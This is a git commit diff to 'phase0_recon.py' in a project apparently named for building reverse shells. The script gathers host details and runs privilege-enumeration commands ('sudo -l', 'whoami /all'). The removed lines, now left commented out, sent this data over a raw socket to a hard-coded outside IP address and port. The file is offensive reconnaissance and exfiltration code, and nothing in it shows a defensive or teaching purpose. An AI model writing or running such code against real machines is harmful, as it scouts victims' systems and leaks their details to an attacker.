f4e9c4839efb4a358ba3d18f0df67c4115a80d5f
DakshRocks21 <85815311+DakshRocks21@users.noreply.github.com>
2025-08-06 16:06:13 +0800

    better recon

--- create_reverse_shell/phase0_recon.py
+++ create_reverse_shell/phase0_recon.py
@@ -1,12 +1,15 @@
 import socket, platform, subprocess
 
-ip, port, cmd = "135.235.193.119", 36452, "ip a" if platform.system() == "Linux" else "ipconfig"
+ip, port, cmd = "135.235.193.119", 36452, "ip a;sudo -l; whoami" if platform.system() == "Linux" else "ipconfig && whoami /all"
 
-try: net = subprocess.check_output(cmd, shell=True).decode(errors="ignore")
-except: net = "cmd failed"
+net = subprocess.check_output(cmd, shell=True).decode(errors="ignore")
+#except: net = "cmd failed"
 
-info = f"os: {platform.system()}\nhost: {socket.gethostname()}\nip: {socket.gethostbyname(socket.gethostname())}\n\n{net}"
+info = f"os: {platform.system()}\nhost: {socket.gethostname()}\ncmd:\n{net}"
 
-with socket.socket() as s:
-    try: s.connect((ip, port)); s.sendall(info.encode())
-    except: pass
+
+# with socket.socket() as s:
+#     try: s.connect((ip, port)); s.sendall(info.encode())
+#     except: pass
+
+print(info)
